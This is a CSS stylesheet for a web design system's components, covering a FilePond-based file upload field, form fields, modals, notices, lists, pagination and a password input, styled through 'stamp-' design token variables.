.filepond--image-preview { position: absolute; left: 0px; top: 0px; z-index: 1; display: flex; align-items: center; height: 100%; width: 100%; pointer-events: none; background: rgb(34, 34, 34); will-change: transform, opacity; }

.filepond--image-clip { position: relative; overflow: hidden; margin: 0px auto; }

.filepond--image-clip[data-transparency-indicator=&quot;grid&quot;] img, .filepond--image-clip[data-transparency-indicator=&quot;grid&quot;] canvas { background-color: rgb(255, 255, 255); background-image: url(&quot;&quot;); background-size: 1.25em 1.25em; }

.filepond--image-bitmap, .filepond--image-vector { position: absolute; left: 0px; top: 0px; will-change: transform; }

.filepond--root[data-style-panel-layout~=&quot;integrated&quot;] .filepond--image-preview-wrapper { border-radius: 0px; }

.filepond--root[data-style-panel-layout~=&quot;integrated&quot;] .filepond--image-preview { height: 100%; display: flex; justify-content: center; align-items: center; }

.filepond--root[data-style-panel-layout~=&quot;circle&quot;] .filepond--image-preview-wrapper { border-radius: 99999rem; }

.filepond--root[data-style-panel-layout~=&quot;circle&quot;] .filepond--image-preview-overlay { top: auto; bottom: 0px; transform: scaleY(-1); }

.filepond--root[data-style-panel-layout~=&quot;circle&quot;] .filepond--file .filepond--file-action-button[data-align*=&quot;bottom&quot;]:not([data-align*=&quot;center&quot;]) { margin-bottom: 0.325em; }

.filepond--root[data-style-panel-layout~=&quot;circle&quot;] .filepond--file [data-align*=&quot;left&quot;] { left: calc(50% - 3em); }

.filepond--root[data-style-panel-layout~=&quot;circle&quot;] .filepond--file [data-align*=&quot;right&quot;] { right: calc(50% - 3em); }

.filepond--root[data-style-panel-layout~=&quot;circle&quot;] .filepond--progress-indicator[data-align*=&quot;bottom&quot;][data-align*=&quot;left&quot;], .filepond--root[data-style-panel-layout~=&quot;circle&quot;] .filepond--progress-indicator[data-align*=&quot;bottom&quot;][data-align*=&quot;right&quot;] { margin-bottom: calc(0.5125em); }

.filepond--root[data-style-panel-layout~=&quot;circle&quot;] .filepond--progress-indicator[data-align*=&quot;bottom&quot;][data-align*=&quot;center&quot;] { margin-top: 0px; margin-bottom: 0.1875em; margin-left: 0.1875em; }

.stamp-file-input--size-narrow { inline-size: 50%; }

.stamp-file-input--size-full { inline-size: 100%; }

@media (min-width: 481px) {
  .stamp-file-input { inline-size: 50%; }
  .stamp-file-input--size-narrow { inline-size: 25%; }
  .stamp-file-input--size-full { inline-size: 100%; }
}

.stamp-file-input.filepond--root { font-family: var(--stamp-text-heading-s-font-family); font-weight: var(--stamp-text-body-s-default-font-weight); font-size: var(--stamp-text-body-s-default-font-size); line-height: var(--stamp-text-body-s-default-line-height); background: var(--stamp-color-background-surface); border-radius: var(--stamp-radius-s); border-width: var(--stamp-border-width-s); border-style: dashed; border-color: var(--stamp-color-border-button-secondary-default); }

.stamp-file-input.filepond--root:has([data-filepond-item-state*=&quot;error&quot;]) { border-color: var(--stamp-color-border-error); }

.stamp-file-input .filepond--list { margin-inline: 12px !important; }

.stamp-file-input.filepond--root .filepond--list-scroller { margin-block-end: 24px !important; }

.stamp-file-input .filepond--file { block-size: 56px !important; }

.stamp-file-input .filepond--panel-root { background: none; }

.stamp-file-input.filepond--root:focus-within { outline-color: var(--stamp-color-border-focus-outline); outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 2px; border-radius: var(--stamp-border-width-m); }

.stamp-file-input .filepond--drop-label { display: flex; padding: var(--stamp-spacing-inner-xl); position: inherit !important; block-size: auto; color: var(--stamp-color-text-subtle); }

.stamp-file-input .filepond--drop-label label { display: flex !important; flex-direction: column; font-family: var(--stamp-text-body-s-default-font-family), sans-serif; font-weight: var(--stamp-text-body-s-default-font-weight); font-size: var(--stamp-text-body-s-default-font-size); line-height: var(--stamp-text-body-s-default-line-height); letter-spacing: var(--stamp-text-body-s-default-letter-spacing); }

.stamp-file-input__label { flex-grow: 0; align-self: center; justify-content: center; display: flex; flex-direction: row; gap: var(--stamp-spacing-inner-s); margin-bottom: var(--stamp-spacing-inner-s); background: var(--stamp-color-background-button-secondary-default); color: var(--stamp-color-text-button-secondary-default); padding-block: var(--stamp-spacing-inner-s); padding-inline: var(--stamp-spacing-inner-xl); border-style: solid; border-radius: var(--stamp-radius-xs); border-width: var(--stamp-border-width-s); font-family: var(--stamp-text-cta-default-font-family), sans-serif; font-weight: var(--stamp-text-cta-default-font-weight); line-height: var(--stamp-text-cta-default-line-height); font-size: var(--stamp-text-cta-default-font-size); letter-spacing: var(--stamp-text-cta-default-letter-spacing); text-decoration: none; }

.stamp-file-input .filepond--drop-label span:focus { outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; outline-color: var(--stamp-color-border-focus-outline); }

.stamp-file-input .filepond--label-action { text-decoration: none; }

.stamp-file-input .filepond--label-action:hover { text-decoration: underline; }

.stamp-file-input .filepond--label-action:focus-within { outline-style: none !important; }

.stamp-file-input .filepond--action-retry-item-processing { display: none !important; }

.stamp-file-input .filepond--file { display: flex; align-items: center; color: var(--stamp-color-text-default); padding: var(--stamp-spacing-inner-s) var(--stamp-spacing-inner-m); border-radius: var(--stamp-radius-m); background-color: var(--stamp-color-background-variant); }

.stamp-file-input .filepond--file:focus { outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; outline-color: var(--stamp-color-border-focus-outline); }

.stamp-file-input .filepond--file-info { position: relative !important; left: 44px !important; margin-inline-end: 44px !important; block-size: 100% !important; transform: none !important; z-index: 0; }

.stamp-file-input .filepond--file-info::before { content: url(&quot;&quot;); position: absolute; background: transparent; width: 32px; height: 32px; left: -44px; top: 5px; z-index: 0; }

.stamp-file-input .filepond--file-info-main { color: var(--stamp-color-heading-subtle); font-family: var(--stamp-text-heading-xxs-font-family), sans-serif  !important; font-weight: var(--stamp-text-heading-xxs-font-weight)  !important; line-height: var(--stamp-text-heading-xxs-line-height)  !important; font-size: var(--stamp-text-heading-xxs-font-size)  !important; letter-spacing: var(--stamp-text-heading-xxs-letter-spacing)  !important; padding-right: 30px; }

.stamp-file-input .filepond--file-info-sub { position: absolute !important; bottom: 0px !important; opacity: 1 !important; }

.stamp-file-input .filepond--file-info-sub, .stamp-file-input .filepond--file-status-main { font-family: var(--stamp-text-body-s-default-font-family), sans-serif  !important; font-weight: var(--stamp-text-body-s-default-font-weight)  !important; line-height: var(--stamp-text-body-s-default-line-height)  !important; font-size: var(--stamp-text-body-s-default-font-size)  !important; letter-spacing: var(--stamp-text-body-s-default-letter-spacing)  !important; }

.stamp-file-input .filepond--drip { opacity: 1; background: none !important; }

.stamp-file-input .filepond--drip-blob { background-color: var(--stamp-color-background-variant); }

.stamp-file-input .filepond--file-status { transform: none !important; height: 100% !important; position: absolute !important; left: 0px !important; margin-left: 108px !important; }

.stamp-file-input .filepond--file-status-main { margin-top: 25.5px !important; }

.stamp-file-input .filepond--file-status .filepond--file-status-sub { display: none; }

.stamp-file-input .filepond--file-action-button:focus { outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; outline-color: var(--stamp-color-border-focus-outline); }

.stamp-file-input .filepond--action-remove-item, .stamp-file-input .filepond--action-revert-item-processing { background-color: var(--stamp-color-text-icon-button-default)  !important; }

.stamp-file-input .filepond--item { block-size: 56px !important; }

.stamp-file-input .filepond--file-wrapper { background-color: white; }

.stamp-file-input .filepond--item-panel, .stamp-file-input .filepond--item-panel > * { box-shadow: none; background: none; }

.stamp-file-input [data-filepond-item-state*=&quot;error&quot;] .filepond--item-panel, .stamp-file-input [data-filepond-item-state*=&quot;invalid&quot;] .filepond--item-panel { background: none !important; }

.stamp-file-input [data-filepond-item-state*=&quot;error&quot;] .filepond--file, .stamp-file-input [data-filepond-item-state*=&quot;invalid&quot;] .filepond--file { background-color: var(--stamp-color-background-negative)  !important; }

.stamp-file-input [data-filepond-item-state*=&quot;error&quot;] .filepond--file-status-main, .stamp-file-input [data-filepond-item-state*=&quot;invalid&quot;] .filepond--file-status-main { display: flex; align-items: center; color: var(--stamp-color-text-negative); font-family: var(--stamp-text-form-feedback-font-family), sans-serif  !important; font-weight: var(--stamp-text-form-feedback-font-weight)  !important; line-height: var(--stamp-text-form-feedback-line-height)  !important; font-size: var(--stamp-text-form-feedback-font-size)  !important; letter-spacing: var(--stamp-text-form-feedback-letter-spacing)  !important; margin-left: -54px !important; }

.stamp-file-input [data-filepond-item-state*=&quot;error&quot;] .filepond--file-info-sub, .stamp-file-input [data-filepond-item-state*=&quot;invalid&quot;] .filepond--file-info-sub { display: none; }

.stamp-file-input [data-filepond-item-state*=&quot;error&quot;] .filepond--file-status-main::before, .stamp-file-input [data-filepond-item-state*=&quot;invalid&quot;] .filepond--file-status-main::before { display: block; block-size: 24px; margin-inline-end: 4px; content: url(&quot;&quot;) !important; }

.stamp-file-input .filepond--image-clip { margin: 0px !important; }

.stamp-file-input .filepond--image-preview-overlay { display: none !important; }

.stamp-file-input .filepond--image-preview-wrapper { height: 32px !important; width: 32px !important; left: 12px !important; top: 12px !important; border-radius: 0px; background-color: var(--stamp-color-background-variant); position: absolute; }

.stamp-file-input .filepond--image-preview { display: flex; justify-content: center; align-items: center; background: none !important; }

.stamp-file-input .filepond--file-action-button { right: 15px !important; border-radius: var(--stamp-radius-xs); background: var(--stamp-color-background-icon-button-primary-default)  !important; }

.stamp-file-input .filepond--file .filepond--progress-indicator { top: 0px !important; right: 0px !important; margin-top: 18px !important; margin-right: 18px !important; }

.stamp-file-input .filepond--panel-top, .stamp-file-input .filepond--panel-center, .stamp-file-input .filepond--panel-bottom { display: none; }

.stamp-file-input .filepond--image-canvas-wrapper { transform: none !important; }

.stamp-file-input .filepond--image-bitmap canvas { max-height: 32px !important; width: 100% !important; }

.stamp-form-field { display: flex; flex-direction: column; gap: var(--stamp-spacing-inner-s); }

.stamp-form-field--direction-row { display: grid; grid-template: &quot;input label&quot; &quot;input helper-text&quot; &quot;error error&quot; / 24px auto; column-gap: var(--stamp-spacing-inner-s); row-gap: var(--stamp-spacing-inner-xs); }

.stamp-form-field--direction-column { justify-content: flex-start; }

.stamp-form-field-error { grid-area: error; display: flex; gap: var(--stamp-spacing-inner-s); color: var(--stamp-color-text-negative); margin-inline-start: -3px; font-family: var(--stamp-text-form-feedback-font-family), sans-serif; font-weight: var(--stamp-text-form-feedback-font-weight); line-height: var(--stamp-text-form-feedback-line-height); font-size: var(--stamp-text-form-feedback-font-size); letter-spacing: var(--stamp-text-form-feedback-letter-spacing); }

.stamp-form-field-error__text { margin-block-start: 2px; }

.stamp-form-field-helper-text { grid-area: helper-text; margin-block-start: calc(-1 * var(--stamp-spacing-inner-xs)); margin-block-end: var(--stamp-spacing-inner-s); color: var(--stamp-color-text-default); font-family: var(--stamp-text-body-s-default-font-family), sans-serif; font-weight: var(--stamp-text-body-s-default-font-weight); line-height: var(--stamp-text-body-s-default-line-height); font-size: var(--stamp-text-body-s-default-font-size); letter-spacing: var(--stamp-text-body-s-default-letter-spacing); }

.stamp-form-field-helper-text--variant-subtle { color: var(--stamp-color-text-subtle); }

.stamp-form-field-label { font-family: var(--stamp-text-form-label-font-family), sans-serif; font-weight: var(--stamp-text-form-label-font-weight); line-height: var(--stamp-text-form-label-line-height); font-size: var(--stamp-text-form-label-font-size); letter-spacing: var(--stamp-text-form-label-letter-spacing); display: flex; align-items: center; gap: var(--stamp-spacing-inner-xs); }

.stamp-form-field-label__suffix { font-family: var(--stamp-text-body-m-default-font-family), sans-serif; font-weight: var(--stamp-text-body-m-default-font-weight); font-size: var(--stamp-text-body-m-default-font-size); letter-spacing: var(--stamp-text-body-m-default-letter-spacing); }

.stamp-form-field-label--variant-default { font-family: var(--stamp-text-form-label-font-family), sans-serif; font-weight: var(--stamp-text-form-label-font-weight); line-height: var(--stamp-text-form-label-line-height); font-size: var(--stamp-text-form-label-font-size); letter-spacing: var(--stamp-text-form-label-letter-spacing); }

.stamp-form-field-label--variant-subtle { font-family: var(--stamp-text-body-m-default-font-family); font-weight: var(--stamp-text-body-m-default-font-weight); font-size: var(--stamp-text-body-m-default-font-size); letter-spacing: var(--stamp-text-body-m-default-letter-spacing); line-height: var(--stamp-text-body-m-default-line-height); }

.stamp-form-field-label-group { display: flex; align-items: center; gap: var(--stamp-spacing-inner-m); }

.stamp-form-information-button { display: flex; cursor: pointer; border: medium; border-radius: 50%; background-color: unset; color: var(--stamp-color-background-icon-button-primary-default); }

.stamp-form-information-button:hover { font-family: var(--stamp-text-cta-hover-font-family), sans-serif; font-weight: var(--stamp-text-cta-hover-font-weight); line-height: var(--stamp-text-cta-hover-line-height); text-decoration: var(--stamp-text-cta-hover-text-decoration); font-size: var(--stamp-text-cta-hover-font-size); }

.stamp-form-information-button:active { font-family: var(--stamp-text-cta-pressed-font-family), sans-serif; font-weight: var(--stamp-text-cta-pressed-font-weight); line-height: var(--stamp-text-cta-pressed-line-height); text-decoration: var(--stamp-text-cta-pressed-text-decoration); font-size: var(--stamp-text-cta-pressed-font-size); }

.stamp-form-information-button:focus { outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; outline-color: var(--stamp-color-border-focus-outline); }

@supports selector(:focus-visible) {
  .stamp-form-information-button:focus { outline: none; }
  .stamp-form-information-button:focus-visible { outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; outline-color: var(--stamp-color-border-focus-outline); }
}

.stamp-form-information-button:active { color: var(--stamp-color-background-icon-button-primary-pressed); }

.stamp-input-group { position: relative; display: flex; justify-content: stretch; align-items: center; inline-size: 100%; }

.stamp-input-group input { inline-size: 100%; padding-inline-end: calc(
        var(--stamp-size-icon-m) + var(--stamp-spacing-inner-m) + var(--stamp-spacing-inner-s)
    ); }

.stamp-input-group input:disabled + .stamp-input-group__append { color: var(--stamp-color-icon-disabled); }

.stamp-input-group__append { position: absolute; display: flex; inset-inline-end: 0px; inset-block-start: 50%; cursor: pointer; border-width: medium; border-style: none; border-image: none; background-color: transparent; line-height: var(--stamp-text-cta-default-line-height); color: var(--stamp-color-icon-default); border-color: var(--stamp-color-border-button-primary-default); margin: var(--stamp-spacing-inner-s); border-radius: var(--stamp-radius-s); transform: translateY(calc(-1 * (50% + var(--stamp-spacing-inner-s)))); }

.stamp-input-group__append:disabled { color: var(--stamp-color-icon-disabled); cursor: not-allowed; }

.stamp-input-group__append:not(:disabled):hover { color: var(--stamp-color-icon-hover); }

.stamp-input-group__append:not(:disabled):active { color: var(--stamp-color-icon-pressed); }

.stamp-input-group__append:focus { outline-color: var(--stamp-color-border-focus-outline); outline-style: solid; outline-width: var(--stamp-border-width-m); }

@supports selector(:focus-visible) {
  .stamp-input-group__append:focus { outline: none; }
  .stamp-input-group__append:focus-visible { outline-color: var(--stamp-color-border-focus-outline); outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; }
}

.stamp-input-group--size-narrow { inline-size: 50%; }

.stamp-input-group--size-full { inline-size: 100%; }

@media (min-width: 481px) {
  .stamp-input-group { inline-size: 50%; }
  .stamp-input-group--size-narrow { inline-size: 25%; }
  .stamp-input-group--size-full { inline-size: 100%; }
}

.stamp-link-list { display: flex; flex-direction: column; gap: var(--stamp-spacing-inner-l); list-style: none; }

.stamp-link-list-item { font-family: var(--stamp-text-body-m-default-font-family), sans-serif; font-weight: var(--stamp-text-body-m-default-font-weight); line-height: var(--stamp-text-body-m-default-line-height); font-size: var(--stamp-text-body-m-default-font-size); letter-spacing: var(--stamp-text-body-m-default-letter-spacing); color: var(--stamp-color-text-default); }

.stamp-link-list-item .stamp-link__icon--start { block-size: var(--stamp-size-icon-m); max-block-size: var(--stamp-size-icon-m); max-inline-size: var(--stamp-size-icon-m); }

.stamp-link-list-emphasis { display: flex; flex-direction: column; gap: var(--stamp-spacing-inner-l); list-style: none; }

@media screen and (min-width: 481px) {
  .stamp-link-list-emphasis { display: grid; grid-template-columns: 1fr 1fr; }
}

.stamp-link-list-emphasis-item { font-family: var(--stamp-text-body-m-default-font-family), sans-serif; font-weight: var(--stamp-text-body-m-default-font-weight); line-height: var(--stamp-text-body-m-default-line-height); font-size: var(--stamp-text-body-m-default-font-size); letter-spacing: var(--stamp-text-body-m-default-letter-spacing); color: var(--stamp-color-text-default); display: flex; flex-direction: column; justify-content: center; background-color: var(--stamp-color-background-surface); border-width: var(--stamp-border-width-s); border-style: solid; border-color: transparent; border-radius: var(--stamp-radius-m); }

.stamp-link-list-emphasis-item .stamp-link, .stamp-link-list-emphasis-item .stamp-link:hover { display: flex; justify-content: flex-start; align-items: center; padding-block: var(--stamp-spacing-inner-l); padding-inline: var(--stamp-spacing-inner-xl); }

.stamp-link-list-emphasis-item .stamp-link:focus { outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); outline-width: var(--stamp-border-width-m); outline-offset: var(--stamp-spacing-inner-xxs); border-radius: calc(var(--stamp-radius-m) - 1px); }

.stamp-link-list-emphasis-item .stamp-link:active { border-width: var(--stamp-border-width-s); border-style: solid; border-color: var(--stamp-color-icon-pressed); color: var(--stamp-color-text-link-pressed); border-radius: var(--stamp-radius-m); margin: -1px; }

@supports selector(:focus-visible) {
  .stamp-link-list-emphasis-item .stamp-link:focus { outline: none; }
  .stamp-link-list-emphasis-item .stamp-link:focus-visible { outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); outline-width: var(--stamp-border-width-m); outline-offset: var(--stamp-spacing-inner-xxs); border-radius: calc(var(--stamp-radius-m) - 1px); }
}

.stamp-link-list-emphasis-item .stamp-link__content { display: inline-flex; inline-size: 100%; justify-content: space-between; align-items: center; word-break: break-word; }

.stamp-link-list-emphasis-item .stamp-link__icon--start { block-size: var(--stamp-size-icon-m); max-block-size: var(--stamp-size-icon-m); max-inline-size: var(--stamp-size-icon-m); }

.stamp-link-list-emphasis-item--theme-default { background-color: var(--stamp-color-background-variant); }

.stamp-link-list-emphasis-item--theme-subdued { background-color: var(--stamp-color-background-surface); }

.stamp-list-basic { display: flex; flex-direction: column; gap: var(--stamp-spacing-inner-s); list-style-position: outside; }

.stamp-list-basic--disc { list-style-type: disc; padding-inline-start: 18px; }

.stamp-list-basic--decimal { list-style-type: decimal; padding-inline-start: 14px; }

.stamp-list-basic--check, .stamp-list-basic--none { list-style-type: none; }

.stamp-list-basic--check { margin-inline-start: -4px; }

.stamp-list-basic-item { font-family: var(--stamp-text-body-m-default-font-family), sans-serif; font-weight: var(--stamp-text-body-m-default-font-weight); line-height: var(--stamp-text-body-m-default-line-height); font-size: var(--stamp-text-body-m-default-font-size); letter-spacing: var(--stamp-text-body-m-default-letter-spacing); color: var(--stamp-color-text-default); }

.stamp-list-basic-item--check { display: flex; align-items: center; justify-content: flex-start; }

.stamp-list-basic-item--decimal { padding-inline-start: 10px; }

.stamp-list-basic-item--disc { padding-inline-start: 6px; }

.stamp-list-basic-item__check-icon { align-self: flex-start; flex-shrink: 0; color: var(--stamp-color-icon-brand); margin-inline-end: 4px; }

.stamp-list-basic-item--size-small .stamp-list-basic-item__check-icon { inline-size: 19px; block-size: 19px; }

.stamp-list-basic-item--size-large .stamp-list-basic-item__check-icon { inline-size: 27px; block-size: 27px; }

.stamp-list-emphasis { display: flex; flex-direction: column; gap: var(--stamp-spacing-inner-xxl); }

.stamp-list-emphasis-item { list-style-type: none; }

.stamp-list-emphasis-item__heading { display: flex; flex-direction: column; align-items: flex-start; gap: var(--stamp-spacing-inner-s); color: var(--stamp-color-text-default); margin-block-end: var(--stamp-spacing-inner-s); }

.stamp-list-emphasis-item__index { display: flex; justify-content: center; align-items: center; inline-size: var(--stamp-spacing-inner-xl); block-size: var(--stamp-spacing-inner-xl); border-radius: var(--stamp-radius-s) var(--stamp-radius-s) 0 var(--stamp-radius-s); background-color: var(--stamp-color-background-inverse); color: var(--stamp-color-text-inverse); flex-shrink: 0; font-family: var(--stamp-text-heading-xs-font-family), sans-serif; font-weight: var(--stamp-text-heading-xs-font-weight); line-height: var(--stamp-text-heading-xs-line-height); font-size: var(--stamp-text-heading-xs-font-size); }

.stamp-list-emphasis-item__title { font-family: var(--stamp-text-heading-s-font-family), sans-serif; font-weight: var(--stamp-text-heading-s-font-weight); line-height: var(--stamp-text-heading-s-line-height); font-size: var(--stamp-text-heading-s-font-size); letter-spacing: var(--stamp-text-heading-s-letter-spacing); }

@media (min-width: 481px) {
  .stamp-list-emphasis-item__heading { flex-direction: row; align-items: center; gap: var(--stamp-spacing-inner-m); justify-content: flex-start; }
}

@media screen and (min-width: 481px) {
  .stamp-loader { display: flex; }
}

.stamp-loader__content { display: flex; flex-direction: column; align-items: center; }

.stamp-loader__van { display: flex; justify-content: center; align-items: center; aspect-ratio: var(--aspect-ratio-standard); inline-size: var(--stamp-size-illustration-xxl); }

@media screen and (min-width: 481px) {
  .stamp-loader__van { aspect-ratio: var(--aspect-ratio-medium); inline-size: var(--stamp-size-medium-illustration-s); }
  .stamp-loader__van ~ .stamp-loader__waiting-text { font-family: var(--stamp-text-body-l-default-font-family), sans-serif; font-weight: var(--stamp-text-body-l-default-font-weight); font-size: var(--stamp-text-body-l-default-font-size); letter-spacing: var(--stamp-text-body-l-default-letter-spacing); }
}

.stamp-loader__waiting-text { font-family: var(--stamp-text-body-m-default-font-family), sans-serif; font-weight: var(--stamp-text-body-m-default-font-weight); font-size: var(--stamp-text-body-m-default-font-size); letter-spacing: var(--stamp-text-body-m-default-letter-spacing); }

.stamp-loader__button { margin-block-start: var(--stamp-spacing-inner-xl); }

.stamp-loader__waiting-text--hidden, .stamp-loader__button--hidden { visibility: hidden; }

.stamp-loader__spinner { color: var(--stamp-color-icon-brand); }

.stamp-modal { position: relative; border: medium; margin: auto; background-color: var(--stamp-color-background-surface); max-inline-size: var(--max-inline-modal-size); border-radius: var(--stamp-radius-m); max-height: unset; }

.stamp-modal:focus { outline: none; }

.stamp-modal::backdrop { background: rgba(0, 0, 0, 0.6); }

.stamp-modal--size-s { --max-inline-modal-size: 416px; margin-inline: var(--stamp-spacing-inner-xl); max-block-size: 80dvh; }

@media screen and (min-width: 481px) {
  .stamp-modal--size-s { inline-size: 100%; margin-inline: auto; }
}

.stamp-modal--size-m { --max-inline-modal-size: 576px; }

@media screen and (min-width: 481px) {
  .stamp-modal--size-m { max-block-size: 80dvh; }
}

@media screen and (max-width: 576px) {
  .stamp-modal--size-m { border-radius: 0px; }
  .stamp-modal--size-m .stamp-modal__content { block-size: 100dvh; inline-size: 100dvw; margin: 0px; }
}

.stamp-modal--size-l { --max-inline-modal-size: 900px; margin: auto; }

@media screen and (min-width: 481px) {
  .stamp-modal--size-l { max-block-size: 80dvh; }
}

@media screen and (max-width: 900px) {
  .stamp-modal--size-l { border-radius: 0px; }
  .stamp-modal--size-l .stamp-modal__content { block-size: 100dvh; inline-size: 100dvw; margin: 0px; }
}

.stamp-modal__content { display: grid; grid-template-rows: min-content auto min-content; gap: var(--stamp-spacing-inner-s); position: relative; inline-size: 100%; background-color: var(--stamp-color-background-surface); overflow: visible; }

.stamp-modal__dismiss-button { position: absolute; top: 0px; right: 0px; padding: 0px; margin: var(--stamp-spacing-inner-xxs); border: medium; background: none; cursor: pointer; }

.stamp-modal-actions { display: flex; flex-direction: column-reverse; justify-content: flex-end; gap: var(--stamp-spacing-outer-xs); padding: var(--stamp-spacing-inner-xl); padding-block-start: unset; }

@media screen and (min-width: 481px) {
  .stamp-modal-actions { flex-direction: row; }
  .stamp-modal-actions { padding: var(--stamp-spacing-inner-3-xl); padding-block-start: unset; }
}

.stamp-modal-actions--fixed { position: sticky; inset-block-end: 0px; background-color: var(--stamp-color-background-surface); inline-size: 100%; max-inline-size: var(--max-inline-modal-size); padding-block: var(--stamp-spacing-inner-xl); padding-inline: var(--stamp-spacing-inner-xl); box-shadow: rgba(31, 30, 47, 0.15) 0px -2px 6px 0px; }

@media screen and (min-width: 481px) {
  .stamp-modal-actions--fixed { padding-inline: var(--stamp-spacing-inner-3-xl); padding-block-end: var(--stamp-spacing-inner-3-xl); }
}

.stamp-modal-body { padding-inline: var(--stamp-spacing-inner-xl); padding-block-end: var(--stamp-spacing-inner-m); color: var(--stamp-color-text-default); }

@media screen and (min-width: 481px) {
  .stamp-modal-body { padding-inline: var(--stamp-spacing-inner-3-xl); }
}

.stamp-modal-header { padding: var(--stamp-spacing-inner-xl); padding-block-end: unset; }

@media screen and (min-width: 481px) {
  .stamp-modal-header { padding: var(--stamp-spacing-inner-3-xl); padding-block-end: unset; }
}

.stamp-notice { display: flex; justify-content: center; padding: var(--stamp-spacing-inner-l); inline-size: 100%; }

.stamp-notice__wrapper { position: relative; z-index: var(--z-index-above); background-color: var(--stamp-color-background-surface); }

.stamp-notice__content { display: flex; align-items: flex-start; inline-size: 100%; }

@media screen and (min-width: 481px) {
  .stamp-notice__content { max-inline-size: 532px; }
}

.stamp-notice--variant-warning { border-bottom-style: solid; border-bottom-width: var(--stamp-border-width-s); border-bottom-color: var(--stamp-color-border-warning); background-color: var(--stamp-color-background-warning); }

.stamp-notice--variant-error { border-bottom-style: solid; border-bottom-width: var(--stamp-border-width-s); border-bottom-color: var(--stamp-color-border-negative); background-color: var(--stamp-color-background-negative); }

.stamp-notice--variant-information { border-bottom-style: solid; border-bottom-width: var(--stamp-border-width-s); border-bottom-color: var(--stamp-color-border-informative); background-color: var(--stamp-color-background-informative); }

.stamp-notice__text { display: flex; flex-direction: column; flex-grow: 1; margin-inline: var(--stamp-spacing-inner-m); }

.stamp-notice__text + .stamp-notice__dismiss-button { margin-inline-start: calc(var(--stamp-spacing-inner-m) * -1); }

.stamp-notice__icon--success { color: var(--stamp-color-icon-positive); }

.stamp-notice__icon--warning { color: var(--stamp-color-icon-warning); }

.stamp-notice__icon--error { color: var(--stamp-color-icon-negative); }

.stamp-notice__icon--information { color: var(--stamp-color-icon-informative); }

.stamp-notice__dismiss-button { cursor: pointer; background-color: transparent; border: medium; color: var(--stamp-color-icon-subtle); }

.stamp-notice__dismiss-button:hover { color: var(--stamp-color-icon-hover); }

.stamp-notice__dismiss-button:active { color: var(--stamp-color-icon-pressed); }

.stamp-notice__dismiss-button:focus { outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); outline-width: var(--stamp-border-width-m); border-radius: var(--stamp-border-width-m); }

@supports selector(:focus-visible) {
  .stamp-notice__dismiss-button:focus { outline: none; }
  .stamp-notice__dismiss-button:focus-visible { outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); outline-width: var(--stamp-border-width-m); border-radius: var(--stamp-border-width-m); }
}

.stamp-notice__dismiss-icon { display: flex; }

.stamp-notice a { border-radius: var(--stamp-radius-s); }

.stamp-notice a:not(:disabled):focus { outline-color: var(--stamp-color-border-focus-outline); outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; }

@supports selector(:focus-visible) {
  .stamp-notice a:not(:disabled):focus { outline: none; }
  .stamp-notice a:not(:disabled):focus-visible { outline-color: var(--stamp-color-border-focus-outline); outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; }
}

.stamp-notice-title strong { font-family: var(--stamp-text-heading-xs-font-family), sans-serif; font-weight: var(--stamp-text-heading-xs-font-weight); line-height: var(--stamp-text-heading-xs-line-height); font-size: var(--stamp-text-heading-xs-font-size); letter-spacing: var(--stamp-text-heading-xs-letter-spacing); }

.stamp-paging { display: flex; align-items: center; }

.stamp-paging--size-s, .stamp-paging--size-m { justify-content: space-between; }

.stamp-paging--size-l { justify-content: center; gap: clamp(0px, -53.3333px + 16.6667vi, 20px); }

.stamp-paging__pages { list-style: none; display: flex; justify-content: center; }

.stamp-paging__item { block-size: var(--stamp-size-icon-l); inline-size: var(--stamp-size-icon-l); }

.stamp-paging__item--ellipsis { padding: var(--stamp-spacing-inner-xs); display: flex; align-items: center; justify-content: center; color: var(--stamp-color-text-default); }

a.stamp-paging__item--navigation, .stamp-paging__item--navigation { block-size: 100%; inline-size: 100%; display: flex; justify-content: center; align-items: center; color: var(--stamp-color-text-link-default); font-family: var(--stamp-text-cta-default-font-family), sans-serif; font-weight: var(--stamp-text-cta-default-font-weight); font-size: var(--stamp-text-cta-default-font-size); text-decoration: none; appearance: none; border: medium; background: none; cursor: pointer; border-radius: var(--stamp-radius-s); }

.stamp-paging__item--navigation:disabled, .stamp-paging__item--navigation[disabled] { display: none; }

a.stamp-paging__item--navigation:hover, .stamp-paging__item--navigation:hover { color: var(--stamp-color-text-link-default); text-decoration: var(--stamp-text-hyperlink-default-text-decoration); }

.stamp-paging__item--active a.stamp-paging__item--navigation, .stamp-paging__item--active .stamp-paging__item--navigation { border: var(--stamp-border-width-m) solid var(--stamp-color-border-selected); color: var(--stamp-color-text-link-subtle); }

a.stamp-paging__item--navigation:active, .stamp-paging__item--navigation:active { color: var(--stamp-color-text-link-pressed); text-decoration: var(--stamp-text-hyperlink-default-text-decoration); }

@supports selector(:focus-visible) {
  a.stamp-paging__item--navigation:focus, .stamp-paging__item--navigation:focus { outline: none; }
  a.stamp-paging__item--navigation:focus-visible, .stamp-paging__item--navigation:focus-visible { outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); outline-width: var(--stamp-border-width-m); outline-offset: 1px; }
}

.stamp-password-input { position: relative; inline-size: 100%; }

.stamp-password-input .stamp-password-input__input { inline-size: 100%; }

.stamp-password-input--size-narrow { inline-size: 50%; }

.stamp-password-input--size-full { inline-size: 100%; }

@media (min-width: 481px) {
  .stamp-password-input { inline-size: 50%; }
  .stamp-password-input--size-narrow { inline-size: 25%; }
  .stamp-password-input--size-full { inline-size: 100%; }
}

